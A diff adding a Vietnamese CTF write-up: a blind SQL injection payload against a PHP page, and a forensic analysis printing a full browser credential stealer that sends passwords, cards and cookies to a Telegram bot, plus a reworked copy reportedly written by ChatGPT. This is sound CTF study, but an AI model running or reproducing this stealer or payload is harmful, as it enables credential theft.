@@ -599,3 +599,526 @@ Chạy code và có kết quả
 ```
 Flag: KCSC{you_can't_see_me:v}
 ```
+
+# _Check Member_ _(WEB)_
+
+![image](https://github.com/user-attachments/assets/f1400526-c131-4985-a0e8-fe06ac69a386)
+
+## _Solution_
+
+Bài cho 1 trang web và 1 tệp .zip giải nén tệp ra được 1 folder db và 1 src
+
+![image](https://github.com/user-attachments/assets/01046806-940a-4379-b2ad-781c62ad1b49)
+
+![image](https://github.com/user-attachments/assets/556081f2-d07c-4971-9996-1bdb6b64c4bb)
+
+Ban đầu, mình truy cập file index.php
+
+![image](https://github.com/user-attachments/assets/3b2b84cd-d52b-43de-8175-7a636d9ffb3a)
+
+```
+Đoạn mã PHP trên là một đoạn script của ứng dụng web, xử lý yêu cầu GET và truy vấn cơ sở dữ liệu.
+
+* Chức năng của mã
+Kiểm tra tham số name từ yêu cầu GET:
+- Nếu URL chứa tham số name (ví dụ: ?name=giatri), mã sẽ lấy giá trị của tham số này và gán vào biến $name.
+
+Kiểm tra số lần xuất hiện của ký tự (:
+- Sử dụng hàm substr_count để đếm số lần ký tự ( xuất hiện trong chuỗi $name.
+- Nếu số lượng ký tự ( lớn hơn 1, chương trình dừng thực thi (die('Dont :(');) và hiển thị thông báo Dont :(.
+
+Kết nối tới cơ sở dữ liệu MySQL với các thông tin sau:
+- Máy chủ: mysql-db
+- Tên người dùng: kcsc
+- Mật khẩu: REDACTED (đã bị ẩn trong đoạn mã)
+- Tên cơ sở dữ liệu: ctf
+- Cổng: 3306
+Truy vấn cơ sở dữ liệu:
+
+Chạy truy vấn SQL: SELECT 1 FROM members WHERE name = '$name'
+- Kiểm tra xem giá trị của $name có tồn tại trong bảng members hay không.
+- Nếu có kết quả, in ra Found :). Nếu không, in ra Not found :(.
+- Đóng kết nối cơ sở dữ liệu:
+
+Sau khi hoàn tất truy vấn, kết nối với cơ sở dữ liệu sẽ được đóng bằng lệnh $mysqli->close();.
+Dừng chương trình:
+
+Kết thúc thực thi mã bằng lệnh die();.
+```
+
+Dễ nhận thấy đây là một lỗ hổng liên quan đến SQL injection
+
+```
+Ví dụ, một người dùng có thể gửi yêu cầu như sau để phá hoại cơ sở dữ liệu:
+
+?name=giatri' OR '1'='1
+```
+
+![image](https://github.com/user-attachments/assets/44fdf2c5-54b9-4083-85e5-62746b2959ae)
+
+Nhận thấy là luôn trả về found 
+
+Và mình chú ý thêm đến init.spl
+
+![image](https://github.com/user-attachments/assets/78a4b329-7ba1-43b4-a8e7-956b9e0df888)
+
+Thấy trong file init.sql có bảng secrets với trường flag nên khả năng flag nằm trong đó
+
+Nên mình dùng câu lệnh truy vấn xác định chuỗi flag xem có trong bảng đó hay không , nếu có thì trả found
+
+```
+KCSC' AND (SELECT flag FROM secrets LIMIT 1) LIKE 'K%' -- -
+```
+
+```
+* Phân tích từng phần:
+
+KCSC': Đây là giá trị nhập của trường name trong bảng members. Dấu ' được sử dụng để thoát khỏi chuỗi SQL ban đầu.
+
+AND: Thêm điều kiện logic để kiểm tra một điều kiện khác.
+
+(SELECT flag FROM secrets LIMIT 1):
+- Truy vấn con này lấy giá trị của cột flag từ bảng secrets.
+- LIMIT 1 đảm bảo rằng chỉ một giá trị đầu tiên trong cột flag được lấy (trong trường hợp có nhiều dòng trong bảng secrets).
+
+LIKE 'K%':
+- Kiểm tra xem giá trị lấy được từ truy vấn con (flag) có bắt đầu bằng ký tự K hay không.
+- % là ký tự đại diện trong SQL, nghĩa là bất kỳ chuỗi nào theo sau chữ K đều hợp lệ.
+
+-- -: Phần còn lại của truy vấn gốc bị bỏ qua do ký tự -- dùng để tạo bình luận trong SQL.
+```
+
+# _Trên đây là toàn bộ bài làm của mình khi chưa hết giải, sau khi kết thúc mình có solve thêm được 1 bài nữa_
+
+# _Invitation_ _(FORENSICS)_
+
+![image](https://github.com/user-attachments/assets/bb762492-dbd2-4287-90f6-dca67c218bd3)
+
+Mình mất khá nhiều thời gian khi không chọn được hướng đi phù hợp cho bài khi giải đang diễn ra 😥
+
+## _Solution_
+
+Thử thách cho mình 1 tệp .zip giải nén ta có được 1 tệp .rar và cuối cùng là 1 file .cmd
+
+![image](https://github.com/user-attachments/assets/a92574d1-b992-41e4-8634-4c56b85182f5)
+
+```
+- File .cmd là một tệp lệnh (batch file) trong hệ điều hành Windows. Tệp này chứa một chuỗi các lệnh mà hệ thống có thể thực thi trong Command Prompt (CMD). 
+- Các lệnh này có thể bao gồm thao tác trên hệ thống, chạy các chương trình, và thực hiện các tác vụ tự động. 
+- Tệp .cmd thường được sử dụng để tự động hóa các tác vụ, ví dụ như cài đặt phần mềm, sao lưu dữ liệu, hoặc cấu hình hệ thống.
+```
+
+Vì đây là lần đầu mình làm việc với file này nên mình cứ thử dùng hết các tool trích xuất chuỗi văn bản như strings hoặc cat
+
+Và đây là lệnh cat
+
+![image](https://github.com/user-attachments/assets/c549aab3-0e12-4140-adee-6a4201459ae4)
+
+Có thể thấy 1 đoạn chuỗi kí tự vừa dài, vừa loằng ngoằng rất khó hiểu
+
+Nhưng lướt xuống cuối thì mình thấy
+
+![image](https://github.com/user-attachments/assets/9072780e-7707-4d7c-bd3f-54c19744149c)
+
+Giữa những kí tự khó hiểu đó là một số đường dẫn và đây là nhận định của mình
+
+```
+- Dường như đây là một đoạn mã hoặc chuỗi lệnh trong một tệp .cmd, có vẻ liên quan đến việc tải về và giải nén một tệp từ một nguồn URL nhất định ở đây là raw.githubusercontent.com
+
+- Sau đó thực thi một tệp PowerShell (powershell.exe) để thực hiện các thao tác tải tệp và giải nén. Một số phần của chuỗi cũng đề cập đến việc chạy một tệp thực thi python .exe
+```
+
+Mình nhìn thấy một link github có một tệp snake.zip mình liền tải về
+
+Giải nén mình có được khá nhiều folder trong đó có các chương trình python, nhưng thứ mình quan tâm nhất là file WindowsUpdate.py do nó được đề cập trong đoạn mã khó hiểu ở trên
+
+Và đây là nội dung bên trong file 
+
+```
+import base64
+import json
+import os
+import shutil
+import sqlite3
+from datetime import datetime, timedelta
+import requests
+
+from Crypto.Cipher import AES
+from win32crypt import CryptUnprotectData
+
+appdata = os.getenv('LOCALAPPDATA')
+
+browsers = {
+    'avast': appdata + '\\AVAST Software\\Browser\\User Data',
+    'amigo': appdata + '\\Amigo\\User Data',
+    'torch': appdata + '\\Torch\\User Data',
+    'kometa': appdata + '\\Kometa\\User Data',
+    'orbitum': appdata + '\\Orbitum\\User Data',
+    'cent-browser': appdata + '\\CentBrowser\\User Data',
+    '7star': appdata + '\\7Star\\7Star\\User Data',
+    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
+    'vivaldi': appdata + '\\Vivaldi\\User Data',
+    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
+    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
+    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
+    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
+    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
+    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
+    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
+    'iridium': appdata + '\\Iridium\\User Data',
+}
+
+data_queries = {
+    'login_data': {
+        'query': 'SELECT action_url, username_value, password_value FROM logins',
+        'file': '\\Login Data',
+        'columns': ['URL', 'Email', 'Password'],
+        'decrypt': True
+    },
+    'credit_cards': {
+        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
+        'file': '\\Web Data',
+        'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
+        'decrypt': True
+    },
+    'cookies': {
+        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
+        'file': '\\Network\\Cookies',
+        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
+        'decrypt': True
+    },
+    'history': {
+        'query': 'SELECT url, title, last_visit_time FROM urls',
+        'file': '\\History',
+        'columns': ['URL', 'Title', 'Visited Time'],
+        'decrypt': False
+    },
+    'downloads': {
+        'query': 'SELECT tab_url, target_path FROM downloads',
+        'file': '\\History',
+        'columns': ['Download URL', 'Local Path'],
+        'decrypt': False
+    }
+}
+
+
+def get_master_key(path: str):
+    if not os.path.exists(path):
+        return
+
+    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
+        return
+
+    with open(path + "\\Local State", "r", encoding="utf-8") as f:
+        c = f.read()
+    local_state = json.loads(c)
+
+    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    key = key[5:]
+    key = CryptUnprotectData(key, None, None, None, 0)[1]
+    return key
+
+
+def decrypt_password(buff: bytes, key: bytes) -> str:
+    iv = buff[3:15]
+    payload = buff[15:]
+    cipher = AES.new(key, AES.MODE_GCM, iv)
+    decrypted_pass = cipher.decrypt(payload)
+    decrypted_pass = decrypted_pass[:-16].decode()
+
+    return decrypted_pass
+
+
+def save_results(browser_name, type_of_data, content):
+    if not os.path.exists('C:/Users/Public/Snake/' + browser_name):
+        os.mkdir('C:/Users/Public/Snake/' + browser_name)
+    if content is not None:
+        open(f'C:/Users/Public/Snake/{browser_name}/{type_of_data}.txt', 'w', encoding="utf-8").write(content)
+        
+
+
+def get_data(path: str, profile: str, key, type_of_data):
+    db_file = f'{path}\\{profile}{type_of_data["file"]}'
+    if not os.path.exists(db_file):
+        return
+    result = ""
+    shutil.copy(db_file, 'temp_db')
+    conn = sqlite3.connect('temp_db')
+    cursor = conn.cursor()
+    cursor.execute(type_of_data['query'])
+    for row in cursor.fetchall():
+        row = list(row)
+        if type_of_data['decrypt']:
+            for i in range(len(row)):
+                if isinstance(row[i], bytes):
+                    row[i] = decrypt_password(row[i], key)
+        if data_type_name == 'history':
+            if row[2] != 0:
+                row[2] = convert_chrome_time(row[2])
+            else:
+                row[2] = "0"
+        result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
+    conn.close()
+    os.remove('temp_db')
+    return result
+
+
+def convert_chrome_time(chrome_time):
+    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')
+
+
+def installed_browsers():
+    available = []
+    for x in browsers.keys():
+        if os.path.exists(browsers[x]):
+            available.append(x)
+    return available
+
+
+if __name__ == '__main__':
+    api = 'https://api.telegram.org/bot6685689576:AAEZDTUeHWzc7nqK84T7IhtBKJyZ0cUbIZo/sendDocument'; id = '5814016276'
+
+    available_browsers = installed_browsers()
+
+    for browser in available_browsers:
+        browser_path = browsers[browser]
+        master_key = get_master_key(browser_path)
+
+        for data_type_name, data_type in data_queries.items():
+            data = get_data(browser_path, "Default", master_key, data_type)
+            save_results(browser, data_type_name, data)
+            with open(f'C:/Users/Public/Snake/{browser}/{data_type_name}.txt', "rb") as exfildat:
+                requests.post(api, data={'caption': "------Exfiltrated Data------ \n Browser: " + browser + "\n Type: " + data_type_name,'chat_id': id}, files={'document': exfildat})
+```
+
+Nội dung chính của đoạn code trên:
+
+```
+1 Trích xuất dữ liệu người dùng:
+
+- Mã định nghĩa một số loại dữ liệu cần trích xuất từ các trình duyệt: mật khẩu (login data), thông tin thẻ tín dụng (credits card), cookie, lịch sử duyệt web (history), và tệp tải về (downloads).
+- Các truy vấn SQL tương ứng được định nghĩa để lấy dữ liệu từ các tệp SQLite (các tệp cơ sở dữ liệu của trình duyệt) và các cột dữ liệu như URL, tên người dùng, mật khẩu, v.v.
+
+2. Lấy và giải mã khóa chính (Master Key):
+- Hàm get_master_key tìm kiếm khóa chính (encrypted key) từ tệp "Local State" của trình duyệt. Nếu tệp này chứa khóa mã hóa,
+- Nếu tệp này chứa khóa mã hóa, Nó sẽ giải mã khóa bằng cách sử dụng phương pháp CryptUnprotectData của Windows và trả về khóa giải mã.
+
+3. Giải mã mật khẩu:
+Hàm decrypt_password nhận dữ liệu đã mã hóa và sử dụng AES GCM để giải mã dữ liệu đó. Dữ liệu mật khẩu sẽ được giải mã và trả về dưới dạng chuỗi.
+
+4.Trích xuất dữ liệu từ cơ sở dữ liệu của trình duyệt:
+- Các hàm như get_data thực hiện sao chép các cơ sở dữ liệu của trình duyệt vào một tệp tạm thời, sau đó kết nối với cơ sở dữ liệu SQLite và thực hiện các truy vấn SQL để lấy dữ liệu.
+- Nếu dữ liệu được mã hóa (như mật khẩu), nó sẽ được giải mã. Lịch sử duyệt web được chuyển đổi từ định dạng thời gian Chrome (microseconds từ năm 1601) sang định dạng ngày giờ dễ đọc.
+
+5. Lưu kết quả:
+- Dữ liệu trích xuất được lưu vào các tệp văn bản trên hệ thống (ví dụ: C:/Users/Public/Snake/{browser}/{data_type_name}.txt).
+- Gửi dữ liệu tới Telegram:
+
+Sau khi trích xuất dữ liệu, tệp dữ liệu sẽ được gửi đến một bot Telegram thông qua API của Telegram.
+Bot sẽ gửi các tệp dữ liệu (như mật khẩu, cookie) kèm theo thông tin về trình duyệt và loại dữ liệu đã bị trích xuất.
+```
+
+Mình nhờ chatgpt viết 1 đoạn python để trích xuất từ trình duyệt các thông tin như (login data), (credits card), (history), (downloads) và gửi chúng đến **bot** -> nhận được phản hồi
+
+```
+import base64
+import json
+import os
+import shutil
+import sqlite3
+from datetime import datetime, timedelta
+import requests
+
+from Crypto.Cipher import AES
+from win32crypt import CryptUnprotectData
+
+appdata = os.getenv('LOCALAPPDATA')
+
+browsers = {
+    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
+    # Add other browsers here...
+}
+
+data_queries = {
+    'cookies': {
+        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
+        'file': '\\Network\\Cookies',
+        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
+        'decrypt': True
+    },
+    # Other data types...
+}
+
+
+def get_master_key(path: str):
+    if not os.path.exists(path):
+        return
+
+    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
+        return
+
+    with open(path + "\\Local State", "r", encoding="utf-8") as f:
+        c = f.read()
+    local_state = json.loads(c)
+
+    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    key = key[5:]
+    key = CryptUnprotectData(key, None, None, None, 0)[1]
+    return key
+
+
+def decrypt_password(buff: bytes, key: bytes) -> str:
+    iv = buff[3:15]
+    payload = buff[15:]
+    cipher = AES.new(key, AES.MODE_GCM, iv)
+    decrypted_pass = cipher.decrypt(payload)
+    decrypted_pass = decrypted_pass[:-16]  # Remove the authentication tag
+
+    try:
+        # Attempt to decode the result as UTF-8, ignoring invalid characters
+        decrypted_pass = decrypted_pass.decode('utf-8', errors='ignore')
+    except UnicodeDecodeError:
+        # If decoding fails, return the raw bytes or handle as needed
+        decrypted_pass = decrypted_pass.hex()  # or return decrypted_pass for raw bytes
+
+    return decrypted_pass
+
+
+def save_results(browser_name, type_of_data, content):
+    base_path = 'C:/Users/Public/Snake/'
+    if not os.path.exists(base_path):
+        os.mkdir(base_path)
+    browser_path = base_path + browser_name
+    if not os.path.exists(browser_path):
+        os.mkdir(browser_path)
+
+    if content is not None:
+        file_path = f'{browser_path}/{type_of_data}.txt'
+        with open(file_path, 'w', encoding="utf-8") as f:
+            f.write(content)
+
+
+def get_data(path: str, profile: str, key, type_of_data):
+    db_file = f'{path}\\{profile}{type_of_data["file"]}'
+    if not os.path.exists(db_file):
+        return
+    result = ""
+    try:
+        shutil.copy(db_file, 'temp_db')
+    except PermissionError:
+        print(f"Permission denied: {db_file}")
+        return  # Skip if file can't be copied
+
+    conn = sqlite3.connect('temp_db')
+    cursor = conn.cursor()
+    cursor.execute(type_of_data['query'])
+    for row in cursor.fetchall():
+        row = list(row)
+        if type_of_data['decrypt']:
+            for i in range(len(row)):
+                if isinstance(row[i], bytes):
+                    row[i] = decrypt_password(row[i], key)
+        if type_of_data['file'] == '\\History':
+            if row[2] != 0:
+                row[2] = convert_chrome_time(row[2])
+            else:
+                row[2] = "0"
+        result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
+    conn.close()
+    os.remove('temp_db')
+    return result
+
+
+def convert_chrome_time(chrome_time):
+    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')
+
+
+def installed_browsers():
+    available = []
+    for x in browsers.keys():
+        if os.path.exists(browsers[x]):
+            available.append(x)
+    return available
+
+
+if __name__ == '__main__':
+    api = 'https://api.telegram.org/bot6685689576:AAEZDTUeHWzc7nqK84T7IhtBKJyZ0cUbIZo/sendDocument'
+    id = '5814016276'
+
+    available_browsers = installed_browsers()
+
+    for browser in available_browsers:
+        browser_path = browsers[browser]
+        master_key = get_master_key(browser_path)
+
+        for data_type_name, data_type in data_queries.items():
+            data = get_data(browser_path, "Default", master_key, data_type)
+            if data:
+                save_results(browser, data_type_name, data)
+                file_path = f'C:/Users/Public/Snake/{browser}/{data_type_name}.txt'
+                if os.path.exists(file_path):
+                    with open(file_path, "rb") as exfildat:
+                        response = requests.post(api, data={'caption': f"------Exfiltrated Data------ \n Browser: {browser} \n Type: {data_type_name}", 'chat_id': id}, files={'document': exfildat})
+                        print(response.text)  # Log the response from Telegram API
+                else:
+                    print(f"File {file_path} not found.")
+
+```
+
+Mình đã chạy đoạn mã này trên máy ảo và những thông tin trích xuất sẽ nằm trong path: C:\Users\Public\Snake\microsoft-edge
+
+![image](https://github.com/user-attachments/assets/3a89fec3-7819-4f9d-990f-bd858879939c)
+
+Mình khá bất ngờ khi mở file .txt ra lại có hết những thông tin đăng nhập, lịch sử, ... trên máy thật của mình ( quả này mình đã nghĩ đến việc mấy anh tạo ra con bot sẽ nhìn thấy hết mất 😥)
+
+Khi đc các anh báo lại thì mình vô phần profile của tài khoản mình ở trình duyệt trên máy thật thì phát hiện là mình đã đồng bộ 2 tài khoản lúc nào không hay 
+
+**Đây là máy chính**
+
+![image](https://github.com/user-attachments/assets/2429fb98-8bf0-45a0-80d9-82344fd0e1e3)
+
+**Và đây là máy ảo**
+
+![image](https://github.com/user-attachments/assets/2702b0b9-8c46-48ba-93eb-b1306eb39711)
+
+Haizz đây đúng là 1 bài học của mình
+
+Quay trở lại vấn đề chính, là mình đã trích xuất được ra những file .txt ở kia nhưng vẫn kh biết làm cách nào để nhận được flag :(
+
+Mình đã thử rất nhiều cách và phải cho đến khi hết giải mình mới tìm ra solution [tại đây](https://github.com/soxoj/telegram-bot-dumper)
+
+Hmm giờ thì làm theo hướng dẫn thôi
+
+Vô [đây](https://core.telegram.org/bots/api) để lấy api và hash về
+
+Mình clone link github đó về và thực hiện lần lượt theo hướng dẫn
+
+![image](https://github.com/user-attachments/assets/df710174-556d-438e-904a-91ccfaae613a)
+
+Đến đây thì mình bị lỗi nên mình sử dụng môi trường ảo để cài
+
+![image](https://github.com/user-attachments/assets/411c9521-6660-4028-beb7-c593901e939c)
+
+Và sau đó là bước cuối 
+
+![image](https://github.com/user-attachments/assets/45da01f3-dcd8-4fe6-b65d-753ac1e59d52)
+
+Có 1 đoạn rất giống base64 ở mục Name
+
+```
+Qk9UOiBLQ1NDe0V4RjFsVHJhdGkwbl8wdjNyX1QzTDNnckBtP30=
+```
+
+Đem đi decode và nhận đc flag
+
+![image](https://github.com/user-attachments/assets/e8d870d9-111c-4e9e-8e06-25564efeec4c)
+
+```
+Flag: KCSC{ExF1lTrati0n_0v3r_T3L3gr@m?}
+```
+
+# _TỔNG KẾT_
+
+_Mình vẫn hơi tiếc khi chưa thể solve thêm 1->2 bài FOR nữa trong lúc giải diễn ra, nhưng mình vẫn rất cảm ơn mọi người khi đã đọc đến đây._ 
+
+**Goodbye!!**
